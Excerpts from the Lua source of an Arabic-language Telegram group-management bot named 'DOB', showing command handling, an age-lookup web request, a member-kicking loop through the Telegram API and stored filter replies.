if text == 'استعاده الاوامر' and DevDOBW(msg) then
...
send(msg.chat_id_, msg.id_, t..'ٴ✭➢ٴ|━━━━━━DB━━━━━━|ٴ✭➢○ٴ\n✭➢ 彡 .[DOB CHANNEL](t.me/dob_g)➢ ')
end
...
ge = https.request('https://rudi-dev.tk/Amir3/DOB.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'دوب')
...
DOB = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(DOB)
...
------------------------------------------------------------------------
local DOBAbot = database:get(bot_id.."DOB1:Add:Filter:Rp2"..text..result.chat_id_)   
if DOBAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ✭➢ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ✭➢ ["..DOBAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local DOB1_Msg = database:get(bot_id.."DOB1:Add:Filter:Rp2"..text..result.chat_id_)   
if DOB1_Msg then    
send(msg.chat_id_, msg.id_," ✭➢ "..DOB1_Msg)
